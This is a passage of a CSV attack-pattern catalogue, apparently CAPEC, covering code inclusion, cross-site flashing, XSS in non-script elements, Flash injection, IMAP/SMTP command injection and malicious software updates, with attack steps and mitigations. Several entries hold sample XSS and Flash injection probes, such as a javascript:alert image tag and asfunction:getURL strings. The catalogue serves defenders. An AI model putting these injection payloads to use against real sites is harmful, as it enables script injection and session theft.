flash file's name in the shared object mySharedObject.data.flash = _root.flashfile; // Load the flash file getURL(_root.flashfile); If an unsuspecting user is lured by an adversary to click on link like this: http://example.com/vulnerable.swf?flashfile=javascript:alert(document.domain) The result will be not merely a one-time execution of the JavaScript code in the victim's browser in the context of the domain with the vulnerable Flash file, but every time the Flash is loaded, whether by direct reference or embedded inside the same domain, the JavaScript will be executed again.::\",\"::88::\",\"\",\"\",\n175,\"Code Inclusion\",Meta,Stable,\"An adversary exploits a weakness on the target to force arbitrary code to be retrieved locally or from a remote location and executed. This differs from code injection in that code injection involves the direct inclusion of code while code inclusion involves the addition or replacement of a reference to a code file, which is subsequently loaded by the target and used as part of the code of some application.\",\"\",Medium,Very High,\"\",\"\",\"::The target application must include external code/libraries that are executed when the application runs and the adversary must be able to influence the specific files that get included.::The victim must run the targeted application, possibly using the crafted parameters that the adversary uses to identify the code to include.::\",\"\",\"::The adversary may need the capability to host code modules if they wish their own code files to be included.::\",\"\",\"\",\"\",\"::One example of this type of attack pattern is PHP file include attacks where the parameter of an include() function is set by a variable that an attacker is able to control. The result is that arbitrary code could be loaded into the PHP application and executed.::\",\"::829::\",\"\",\"\",\n176,\"Configuration/Environment Manipulation\",Meta,Draft,\"An attacker manipulates files or settings external to a target application which affect the behavior of that application. For example, many applications use external configuration files and libraries - modification of these entities or otherwise affecting the application's ability to use them would constitute a configuration/environment manipulation attack.\",\"\",,Medium,\"\",\"\",\"::The target application must consult external files or configuration controls to control its execution. All but the very simplest applications meet this requirement.::\",\"\",\"::The attacker must have the access necessary to affect the files or other environment items the targeted application uses for its operations.::\",\"\",\"\",\"\",\"\",\"::15::1233::1234::1304::1328::\",\"TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Setting Manipulation::\",\"\",\n177,\"Create files with the same name as files protected with a higher classification\",Detailed,Draft,\"An attacker exploits file location algorithms in an operating system or application by creating a file with the same name as a protected or privileged file. The attacker could manipulate the system if the attacker-created file is trusted by the operating system or an application component that attempts to load the original file. Applications often load or include external files, such as libraries or configuration files. These files should be protected against malicious manipulation. However, if the application only uses the name of the file when locating it, an attacker may be able to create a file with the same name and place it in a directory that the application will search before the directory with the legitimate file is searched. Because the attackers' file is discovered first, it would be used by the target application. This attack can be extremely destructive if the referenced file is executable and/or is granted special privileges based solely on having a particular name.\",\"\",,Very High,\"::NATURE:ChildOf:CAPEC ID:17::\",\"\",\"::The target application must include external files. Most non-trivial applications meet this criterion.::The target application does not verify that a located file is the one it was looking for through means other than the name. Many applications fail to perform checks of this type.::The directories the target application searches to find the included file include directories writable by the attacker which are searched before the protected directory containing the actual files. It is much less common for applications to meet this criterion, but if an attacker can manipulate the application's search path (possibly by controlling environmental variables) then they can force this criterion to be met.::\",\"\",\"::The attacker must have sufficient access to place an arbitrarily named file somewhere early in the application's search path.::\",\"\",\"\",\"\",\"\",\"::706::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1036:ENTRY NAME:Masquerading::\",\"\",\n178,\"Cross-Site Flashing\",Detailed,Draft,\"An attacker is able to trick the victim into executing a Flash document that passes commands or calls to a Flash player browser plugin, allowing the attacker to exploit native Flash functionality in the client browser. This attack pattern occurs where an attacker can provide a crafted link to a Flash document (SWF file) which, when followed, will cause additional malicious instructions to be executed. The attacker does not need to serve or control the Flash document. The attack takes advantage of the fact that Flash files can reference external URLs. If variables that serve as URLs that the Flash application references can be controlled through parameters, then by creating a link that includes values for those parameters, an attacker can cause arbitrary content to be referenced and possibly executed by the targeted Flash application.\",\"\",Medium,Medium,\"::NATURE:ChildOf:CAPEC ID:182::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identification] Using a browser or an automated tool, an attacker records all instances of URLs (or partial URL such as domain) passed to a flash file (SWF).:TECHNIQUE:Use an automated tool to record the variables passed to a flash file.:TECHNIQUE:Use a browser to manually explore the website and analyze how the flash file receive variables, e.g. JavaScript using SetVariable/GetVariable, HTML FlashVars param tag, etc.:TECHNIQUE:Use decompilers to retrieve the flash source code and record all user-controllable variables passed to a loadMovie* directive.::STEP:2:PHASE:Experiment:DESCRIPTION:[Attempt to inject a remote flash file] The attacker makes use of a remotely available flash file (SWF) that generates a uniquely identifiable output when executed inside the targeted flash file.:TECHNIQUE:Modify the variable of the SWF file that contains the remote movie URL to the attacker controlled flash file.::STEP:3:PHASE:Exploit:DESCRIPTION:[Access or Modify Flash Application Variables] As the attacker succeeds in exploiting the vulnerability, they target the content of the flash application to steal variable content, password, etc.:TECHNIQUE:Develop malicious Flash application that is injected through vectors identified during the Experiment Phase and loaded by the victim browser's flash plugin and sends document information to the attacker.:TECHNIQUE:Develop malicious Flash application that is injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the flash application to execute appropriately.::STEP:4:PHASE:Exploit:DESCRIPTION:[Execute JavaScript in victim's browser] When the attacker targets the current flash application, they can choose to inject JavaScript in the client's DOM and therefore execute cross-site scripting attack.:TECHNIQUE:Develop malicious JavaScript that is injected from the rogue flash movie to the targeted flash application through vectors identified during the Experiment Phase and loaded by the victim's browser.::\",\"::The targeted Flash application must reference external URLs and the locations thus referenced must be controllable through parameters. The Flash application must fail to sanitize such parameters against malicious manipulation. The victim must follow a crafted link created by the attacker.::\",\"::SKILL:knowledge of Flash internals, parameters and remote referencing.:LEVEL:Medium::\",\"\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-Repudiation:TECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism::\",\"::Implementation: Only allow known URL to be included as remote flash movies in a flash application::Configuration: Properly configure the crossdomain.xml file to only include the known domains that should host remote flash movies.::\",\"::The attacker tries to get their malicious flash movie to be executed in the targeted flash application. The malicious file is hosted on the attacker.com domain and the targeted flash application is hosted on example.com The crossdomain.xml file in the root of example.com allows all domains and no specific restriction is specified in the targeted flash application. When the attacker injects their malicious file in the vulnerable flash movie, the rogue flash application is able to access internal variables and parameter of the flash movie.::\",\"::601::\",\"\",\"\",\n179,\"Calling Micro-Services Directly\",Standard,Draft,\"An attacker is able to discover and query Micro-services at a web location and thereby expose the Micro-services to further exploitation by gathering information about their implementation and function. Micro-services in web pages allow portions of a page to connect to the server and update content without needing to cause the entire page to update. This allows user activity to change portions of the page more quickly without causing disruptions elsewhere.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:554::\",\"\",\"::The target site must use micro-services that interact with the server and one or more of these micro-services must be vulnerable to some other attack pattern.::\",\"\",\"::The attacker usually needs to be able to invoke micro-services directly in order to control the parameters that are used in their attack. The attacker may require other resources depending on the nature of the flaw in the targeted micro-service.::\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\n18,\"XSS Targeting Non-Script Elements\",Detailed,Draft,\"This attack is a form of Cross-Site Scripting (XSS) where malicious scripts are embedded in elements that are not expected to host scripts such as image tags (<img>), comments in XML documents (< !-CDATA->), etc. These tags may not be subject to the same input validation, output validation, and other content filtering and checking routines, so this can create an opportunity for an adversary to tunnel through the application's elements and launch a XSS attack through other elements. As with all remote attacks, it is important to differentiate the ability to launch an attack (such as probing an internal network for unpatched servers) and the ability of the remote adversary to collect and interpret the output of said attack.\",\"\",High,Very High,\"::NATURE:ChildOf:CAPEC ID:591::NATURE:ChildOf:CAPEC ID:592::NATURE:ChildOf:CAPEC ID:588::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for user-controllable inputs] Using a browser or an automated tool, an adversary records all entry points for inputs that happen to be reflected in a client-side non-script element. These non-script elements can be located in the HTML content (head, body, comments), in an HTML tag, XML, CSS, etc.:TECHNIQUE:Use a spidering tool to follow and record all non-static links that are likely to have input parameters (through forms, URL, fragments, etc.) actively used by the Web application.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe identified potential entry points for XSS vulnerability] The adversary uses the entry points gathered in the Explore phase as a target list and injects various common script payloads to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited.:TECHNIQUE:Manually inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a client-side non-script elements context and observe system behavior to determine if script was executed. Since these probes may have to be injected in many different types of non-script elements, they should cover a variety of possible contexts (CSS, HTML tag, XML, etc.).:TECHNIQUE:Use an automated injection attack tool to inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a client-side non-script elements context and observe system behavior to determine if script was executed. Since these probes may have to be injected in many different types of non-script elements, they should cover a variety of possible contexts (CSS, HTML tag, XML, etc.).:TECHNIQUE:Use a proxy tool to record results of the created requests.::STEP:3:PHASE:Experiment:DESCRIPTION:[Create malicious XSS content] Once the adversary has determined which entry points are vulnerable to XSS, they will interact with the web application to store the malicious content. Because of the nature of this attack, it is mostly carried out through stored XSS, although it is possible to perform this attack using reflected XSS. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from a victim.:TECHNIQUE:Store a malicious script on a page, disguised as a non-script element, that will execute when viewed by the victim.:TECHNIQUE:Use a tool such as BeEF to store a hook into the web application. This will alert the adversary when the victim has accessed the content and will give the adversary control over the victim's browser, allowing them access to cookies, user screenshot, user clipboard, and more complex XSS attacks.::STEP:4:PHASE:Exploit:DESCRIPTION:[Get victim to view stored content] In order for the attack to be successful, the victim needs to view the stored malicious content on the webpage.:TECHNIQUE:Send a phishing email to the victim containing a URL that will direct them to the malicious stored content.:TECHNIQUE:Simply wait for a victim to view the content. This is viable in situations where content is posted to a popular public forum.::\",\"::The target client software must allow the execution of scripts generated by remote hosts.::\",\"::SKILL:To achieve a redirection and use of less trusted source, an adversary can simply edit content such as XML payload or HTML files that are sent to client machine.:LEVEL:Low::SKILL:Exploiting a client side vulnerability to inject malicious scripts into the browser's executable process.:LEVEL:High::\",\"::Ability to include malicious script in document, e.g. HTML file, or XML document. Ability to deploy a custom hostile service for access by targeted clients. Ability to communicate synchronously or asynchronously with client machine::\",\"\",\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::In addition to the traditional input fields, all other user controllable inputs, such as image tags within messages or the likes, must also be subjected to input validation. Such validation should ensure that content that can be potentially interpreted as script by the browser is appropriately filtered.::All output displayed to clients must be properly escaped. Escaping ensures that the browser interprets special scripting characters literally and not as script to be executed.::\",\"::An online discussion forum allows its members to post HTML-enabled messages, which can also include image tags. A malicious user embeds JavaScript in the IMG tags in their messages that gets executed within the victim's browser whenever the victim reads these messages. <img src=javascript:alert('XSS')> When executed within the victim's browser, the malicious script could accomplish a number of adversary objectives including stealing sensitive information such as usernames, passwords, or cookies.::\",\"::80::\",\"\",\"\",\n180,\"Exploiting Incorrectly Configured Access Control Security Levels\",Standard,Draft,\"An attacker exploits a weakness in the configuration of access controls and is able to bypass the intended protection that these measures guard against and thereby obtain unauthorized access to the system or network. Sensitive functionality should always be protected with access controls. However configuring all but the most trivial access control systems can be very complicated and there are many opportunities for mistakes. If an attacker can learn of incorrectly configured access security settings, they may be able to exploit this in an attack.\",\"\",High,Medium,\"::NATURE:ChildOf:CAPEC ID:122::NATURE:CanPrecede:CAPEC ID:17::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey] The attacker surveys the target application, possibly as a valid and authenticated user.:TECHNIQUE:Spider the web site for all available links.:TECHNIQUE:Brute force to guess all function names/action with different privileges.::STEP:2:PHASE:Experiment:DESCRIPTION:[Identify weak points in access control configurations] The attacker probes the access control for functions and data identified in the Explore phase to identify potential weaknesses in how the access controls are configured.:TECHNIQUE:The attacker attempts authenticated access to targeted functions and data.:TECHNIQUE:The attacker attempts unauthenticated access to targeted functions and data.:TECHNIQUE:The attacker attempts indirect and side channel access to targeted functions and data.::STEP:3:PHASE:Exploit:DESCRIPTION:[Access the function or data bypassing the access control] The attacker executes the function or accesses the data identified in the Explore phase bypassing the access control.:TECHNIQUE:The attacker executes the function or accesses the data not authorized to them.::\",\"::The target must apply access controls, but incorrectly configure them. However, not all incorrect configurations can be exploited by an attacker. If the incorrect configuration applies too little security to some functionality, then the attacker may be able to exploit it if the access control would be the only thing preventing an attacker's access and it no longer does so. If the incorrect configuration applies too much security, it must prevent legitimate activity and the attacker must be able to force others to require this activity..::\",\"::SKILL:In order to discover unrestricted resources, the attacker does not need special tools or skills. They only have to observe the resources or access mechanisms invoked as each action is performed and then try and access those access mechanisms directly.:LEVEL:Low::\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution::\",\"::Design: Configure the access control correctly.::\",\"::For example, an incorrectly configured Web server, may allow unauthorized access to it, thus threaten the security of the Web application.::\",\"::732::1190::1191::1193::1220::1268::1280::1297::1311::1315::1318::1320::1321::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1574.010:ENTRY NAME:Hijack Execution Flow: Services File Permissions Weaknesses::\",\"\",\n181,\"Flash File Overlay\",Detailed,Draft,\"An attacker creates a transparent overlay using flash in order to intercept user actions for the purpose of performing a clickjacking attack. In this technique, the Flash file provides a transparent overlay over HTML content. Because the Flash application is on top of the content, user actions, such as clicks, are caught by the Flash application rather than the underlying HTML. The action is then interpreted by the overlay to perform the actions the attacker wishes.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:103::\",\"\",\"::The victim must be tricked into navigating to the attackers' decoy site and performing the actions on the decoy page.::The victim's browser must support invisible Flash overlays.::\",\"\",\"::The attacker must be able to force the Flash overlay over the decoy content.::\",\"\",\"\",\"\",\"\",\"::1021::\",\"\",\"\",\n182,\"Flash Injection\",Standard,Draft,\"An attacker tricks a victim to execute malicious flash content that executes commands or makes flash calls specified by the attacker. One example of this attack is cross-site flashing, an attacker controlled parameter to a reference call loads from content specified by the attacker.\",\"\",High,Medium,\"::NATURE:ChildOf:CAPEC ID:137::NATURE:CanAlsoBe:CAPEC ID:248::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Find Injection Entry Points] The attacker first takes an inventory of the entry points of the application.:TECHNIQUE:Spider the website for all available URLs that reference a Flash application.:TECHNIQUE:List all uninitialized global variables (such as _root.*, _global.*, _level0.*) in ActionScript, registered global variables in included files, load variables to external movies.::STEP:2:PHASE:Experiment:DESCRIPTION:[Determine the application's susceptibility to Flash injection] Determine the application's susceptibility to Flash injection. For each URL identified in the explore phase, the attacker attempts to use various techniques such as direct load asfunction, controlled evil page/host, Flash HTML injection, and DOM injection to determine whether the application is susceptible to Flash injection.:TECHNIQUE:Test the page using direct load asfunction, getURL,javascript:gotRoot()///d.jpg:TECHNIQUE:Test the page using controlled evil page/host, http://example.com/evil.swf:TECHNIQUE:Test the page using Flash HTML injection, '><img src='asfunction:getURL,javascript:gotRoot()//.jpg' >:TECHNIQUE:Test the page using DOM injection, (gotRoot(''))::STEP:3:PHASE:Exploit:DESCRIPTION:[Inject malicious content into target] Inject malicious content into target utilizing vulnerable injection vectors identified in the Experiment phase::\",\"::The target must be capable of running Flash applications. In some cases, the victim must follow an attacker-supplied link.::\",\"::SKILL:The attacker needs to have knowledge of Flash, especially how to insert content the executes commands.:LEVEL:Medium::\",\"::None: No specialized resources are required to execute this type of attack. The attacker may need to be able to serve the injected Flash content.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Other:NOTE:Information Leakage::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-Repudiation:TECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism::\",\"::Implementation: remove sensitive information such as user name and password in the SWF file.::Implementation: use validation on both client and server side.::Implementation: remove debug information.::Implementation: use SSL when loading external data::Implementation: use crossdomain.xml file to allow the application domain to load stuff or the SWF file called by other domain.::\",\"::In the following example, the SWF file contains getURL('javascript:SomeFunc(someValue)','','GET') A request like http://example.com/noundef.swf?a=0:0;alert('XSS') becomes javascript:SomeFunc(someValue)?a=0:0;alert(123)::\",\"::20::184::697::\",\"\",\"\",\n183,\"IMAP/SMTP Command Injection\",Standard,Draft,\"An adversary exploits weaknesses in input validation on web-mail servers to execute commands on the IMAP/SMTP server. Web-mail servers often sit between the Internet and the IMAP or SMTP mail server. User requests are received by the web-mail servers which then query the back-end mail server for the requested information and return this response to the user. In an IMAP/SMTP command injection attack, mail-server commands are embedded in parts of the request sent to the web-mail server. If the web-mail server fails to adequately sanitize these requests, these commands are then sent to the back-end mail server when it is queried by the web-mail server, where the commands are then executed. This attack can be especially dangerous since administrators may assume that the back-end server is protected against direct Internet access and therefore may not secure it adequately against the execution of malicious commands.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:248::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify Target Web-Mail Server] The adversary first identifies the web-mail server they wish to exploit.::STEP:2:PHASE:Experiment:DESCRIPTION:[Identify Vulnerable Parameters] Once the adversary has identified a web-mail server, they identify any vulnerable parameters by altering their values in requests. The adversary knows that the parameter is vulnerable if the web-mail server returns an error of any sort. Ideally, the adversary is looking for a descriptive error message.:TECHNIQUE:Assign a null value to a parameter being used by the web-mail server and observe the response.:TECHNIQUE:Assign a random value to a parameter being used by the web-mail server and observe the response.:TECHNIQUE:Add additional values to a parameter being used by the web-mail server and observe the response.:TECHNIQUE:Add non standard special characters (i.e.: , ', , @, #, !, |) to a parameter being used by the web-mail server and observe the response.:TECHNIQUE:Eliminate a parameter being used by the web-mail server and observe the response.::STEP:3:PHASE:Experiment:DESCRIPTION:[Determine Level of Injection] After identifying all vulnerable parameters, the adversary determines what level of injection is possible.:TECHNIQUE:Evaluate error messages to determine what IMAP/SMTP command is being executed for the vulnerable parameter. Sometimes the actually query will be placed in the error message.:TECHNIQUE:If there aren't descriptive error messages, the adversary will analyze the affected functionality to deduce the possible commands that could be being used by the mail-server.::STEP:4:PHASE:Exploit:DESCRIPTION:[Inject IMAP/SMTP Commands] The adversary manipulates the vulnerable parameters to inject an IMAP/SMTP command and execute it on the mail-server.:TECHNIQUE:Structure the injection as a header, body, and footer. The header contains the ending of the expected message, the body contains the injection of the new command, and the footer contains the beginning of the expected command.:TECHNIQUE:Each part of the injection payload needs to be terminated with the CRLF (%0d%0a) sequence.::\",\"::The target environment must consist of a web-mail server that the attacker can query and a back-end mail server. The back-end mail server need not be directly accessible to the attacker.::The web-mail server must fail to adequately sanitize fields received from users and passed on to the back-end mail server.::The back-end mail server must not be adequately secured against receiving malicious commands from the web-mail server.::\",\"\",\"::None: No specialized resources are required to execute this type of attack. However, in most cases, the attacker will need to be a recognized user of the web-mail server.::\",\"\",\"\",\"\",\"\",\"::77::\",\"\",\"\",\n184,\"Software Integrity Attack\",Meta,Draft,\"An attacker initiates a series of events designed to cause a user, program, server, or device to perform actions which undermine the integrity of software code, device data structures, or device firmware, achieving the modification of the target's integrity to achieve an insecure state.\",\"\",,Low,\"\",\"\",\"\",\"::SKILL:Manual or user-assisted attacks require deceptive mechanisms to trick the user into clicking a link or downloading and installing software. Automated update attacks require the attacker to host a payload and then trigger the installation of the payload code.:LEVEL:Medium::\",\"::Software Integrity Attacks are usually a late stage focus of attack activity which depends upon the success of a chain of prior events. The resources required to perform the attack vary with respect to the overall attack strategy, existing countermeasures which must be bypassed, and the success of early phase attack vectors.::\",\"\",\"\",\"\",\"\",\"::494::\",\"\",\"\",\n185,\"Malicious Software Download\",Standard,Draft,\"An attacker uses deceptive methods to cause a user or an automated process to download and install dangerous code that originates from an attacker controlled source. There are several variations to this strategy of attack.\",\"\",,Very High,\"::NATURE:ChildOf:CAPEC ID:184::NATURE:CanPrecede:CAPEC ID:662::\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"::494::\",\"\",\"\",\n186,\"Malicious Software Update\",Standard,Draft,\"An adversary uses deceptive methods to cause a user or an automated process to download and install dangerous code believed to be a valid update that originates from an adversary controlled source.\",\"\",,High,\"::NATURE:ChildOf:CAPEC ID:184::NATURE:CanFollow:CAPEC ID:98::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify target] The adversary must first identify what they want their target to be. Because malicious software updates can be carried out in a variety of ways, the adversary will first not only identify a target program, but also what users they wish to target. This attack can be targeted (a particular user or group of users) or untargeted (many different users).::STEP:2:PHASE:Experiment:DESCRIPTION:[Craft a deployment mechanism based on the target] The adversary must craft a deployment mechanism to deploy the malicious software update. This mechanism will differ based on if the attack is targeted or untargeted.:TECHNIQUE:Targeted attack: hosting what appears to be a software update, then harvesting actual email addresses for an organization, or generating commonly used email addresses, and then sending spam, phishing, or spear-phishing emails to the organization's users requesting that they manually download and install the malicious software update.:TECHNIQUE:Targeted attack: Instant Messaging virus payload, which harvests the names from a user's contact list and sends instant messages to those users to download and apply the update:TECHNIQUE:Untargeted attack: Spam the malicious update to as many users as possible through unsolicited email, instant messages, or social media messages.:TECHNIQUE:Untargeted attack: Send phishing emails to as many users as possible and pretend to be a legitimate source suggesting to download an important software update.:TECHNIQUE:Untargeted attack: Use trojans/botnets to aid in either of the two untargeted attacks.::STEP:3:PHASE:Exploit:DESCRIPTION:[Deploy malicious software update] Using the deployment mechanism from the previous step, the adversary gets a user to install the malicious software update.::\",\"\",\"::SKILL:This attack requires advanced cyber capabilities:LEVEL:High::\",\"::Manual or user-assisted attacks require deceptive mechanisms to trick the user into clicking a link or downloading and installing software. Automated update attacks require the adversary to host a payload and then trigger the installation of the payload code.::\",\"\",\"::SCOPE:Access Control:SCOPE:Availability:SCOPE:Confidentiality:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Utilize the built-in software update mechanisms of the commercial components to deliver software that could compromise security credentials, enable a denial-of-service attack, or enable tracking.::\",\"::Validate software updates before installing.::\",\"::Using an automated process to download and install dangerous code was key part of the NotPeyta attack [REF-697]::\",\"::494::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195.002:ENTRY NAME:Supply Chain Compromise: Compromise Software Supply Chain::\",\"TYPE:Other:NOTE:Other class of attacks focus on firmware, where malicious updates are made to the core system firmware or BIOS. Since this occurs outside the controls of the operating system, the OS detection and prevention mechanisms do not aid, thus allowing an adversary to evade defenses as well as gain persistence on the target's system.::\",\n187,\"Malicious Automated Software Update via Redirection\",Detailed,Draft,\"An attacker exploits two layers of weaknesses in server or client software for automated update mechanisms to undermine the integrity of the target code-base. The first weakness involves a failure to properly authenticate a server as a source of update or patch content. This type of weakness typically results from authentication mechanisms which can be defeated, allowing a hostile server to satisfy the criteria that establish a trust relationship. The second weakness is a systemic failure to validate the identity and integrity of code downloaded from a remote location, hence the inability to distinguish malicious code from a legitimate update.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:186::\",\"\",\"\",\"\",\"\",\"\",\"::SCOPE:Access Control:SCOPE:Availability:SCOPE:Confidentiality:TECHNICAL IMPACT:Execute Unauthorized Commands::\",\"\",\"\",\"::494::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1072:ENTRY NAME:Software Deployment Tools::\",\"\",\n188,\"Reverse Engineering\",Meta,Stable,\"An adversary discovers the structure, function, and composition of an object, resource, or system by using a variety of analysis techniques to effectively determine how the analyzed entity was constructed or operates. The goal of reverse engineering is often to duplicate the function, or a part of the function, of an object in order to duplicate or back engineer some aspect of its functioning. Reverse engineering techniques can be applied to mechanical objects, electronic devices, or software, although the methodology and techniques involved in each type of analysis differ widely.\",\"\",Low,Low,\"\",\"\",\"::Access to targeted system, resources, and information.::\",\"::SKILL:Understanding of low level programming languages or technologies can be very helpful. For example, when reverse engineering a binary file, an understanding of assembly languages can help to determine the purpose and inner-workings of the code. Another example is reverse engineering an application that relies on networking. Here, an understanding networking protocols can provide insight into application details.:LEVEL:High::\",\"::The technical resources necessary to engage in reverse engineering differ in accordance with the type of object, resource, or system being analyzed.::\",\"\",\"\",\"::Employ code obfuscation techniques to prevent the adversary from reverse engineering the targeted entity.::\",\"::When adversaries are reverse engineering software, methodologies fall into two broad categories, 'white box' and 'black box.' White box techniques involve methods which can be applied to a piece of software when an executable or some other compiled object can be directly subjected to analysis, revealing at least a portion of its machine instructions that can be observed upon execution. 'Black Box' methods involve interacting with the software indirectly, in the absence of the ability to measure, instrument, or analyze an executable object directly. Such analysis typically involves interacting with the software at the boundaries of where the software interfaces with a larger execution environment, such as input-output vectors, libraries, or APIs.::\",\"::1278::\",\"\",\"\",\n189,\"Black Box Reverse Engineering\",Standard,Draft,\"An adversary discovers the structure, function, and composition of a type of computer software through black box analysis techniques. 'Black Box' methods involve interacting with the software indirectly, in the absence of direct access to the executable object. Such analysis typically involves interacting with the software at the boundaries of where the software interfaces with a larger execution environment, such as input-output vectors, libraries, or APIs. Black Box Reverse Engineering also refers to gathering physical side effects of a hardware device, such as electromagnetic radiation or sounds.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:188::\",\"\",\"\",\"\",\"::Black box methods require (at minimum) the ability to interact with the functional boundaries where the software communicates with a larger processing environment, such as inter-process communication on a host operating system, or via networking protocols.::\",\"\",\"\",\"\",\"\",\"::203::1255::1300::\",\"\",\"\",\n19,\"Embedding Scripts within Scripts\",Standard,Stable,\"An adversary leverages the capability to execute their own script by embedding it within other scripts that the target software is likely to execute due to programs' vulnerabilities that are brought on by allowing remote hosts to execute scripts.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:242::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Spider] Using a browser or an automated tool, an adversary records all entry points for inputs that happen to be reflected in a client-side script element. These script elements can be located in the HTML content (head, body, comments), in an HTML tag, XML, CSS, etc.:TECHNIQUE:Use a spidering tool to follow and record all non-static links that are likely to have input parameters (through forms, URL, fragments, etc.) actively used by the Web application.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe identified potential entry points for XSS vulnerability] The adversary uses the entry points gathered in the Explore phase as a target list and injects various common script payloads to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited.:TECHNIQUE:Manually inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a client-side script elements context and observe system behavior to determine if script was executed.:TECHNIQUE:Manually inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a server-side script elements context and observe system behavior to determine if script was executed.:TECHNIQUE:Use an automated injection attack tool to inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a client-side script elements context and observe system behavior to determine if script was executed.:TECHNIQUE:Use an automated injection attack tool to inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a server-side script elements context and observe system behavior to determine if script was executed.:TECHNIQUE:Use a proxy tool to record results of the created requests.::STEP:3:PHASE:Exploit:DESCRIPTION:[Steal session IDs, credentials, page content, etc.] As the adversary succeeds in exploiting the vulnerability, they can choose to steal user's credentials in order to reuse or to analyze them later on.:TECHNIQUE:Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and sends document information to the adversary.:TECHNIQUE:Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an adversary's server and then causes the browser to execute appropriately.::STEP:4:PHASE:Exploit:DESCRIPTION:[Forceful browsing] When the adversary targets the current application or another one (through CSRF vulnerabilities), the user will then be the one who perform the attacks without being aware of it. These attacks are mostly targeting application logic flaws, but it can also be used to create a widespread attack against a particular website on the user's current network (Internet or not).:TECHNIQUE:Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and performs actions on the same web site:TECHNIQUE:Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an adversary's server and then causes the browser to execute request to other web sites (especially the web applications that have CSRF vulnerabilities).::STEP:5:PHASE:Exploit:DESCRIPTION:[Content spoofing] By manipulating the content, the adversary targets the information that the user would like to get from the website.:TECHNIQUE:Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and exposes adversary-modified invalid information to the user on the current web page.::\",\"::Target software must be able to execute scripts, and also grant the adversary privilege to write/upload scripts.::\",\"::SKILL:To load malicious script into open, e.g. world writable directory:LEVEL:Low::SKILL:Executing remote scripts on host and collecting output:LEVEL:Medium::\",\"\",\"\",\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Use browser technologies that do not allow client side scripting.::Utilize strict type, character, and encoding enforcement.::Server side developers should not proxy content via XHR or other means. If a HTTP proxy for remote content is setup on the server side, the client's browser has no way of discerning where the data is originating from.::Ensure all content that is 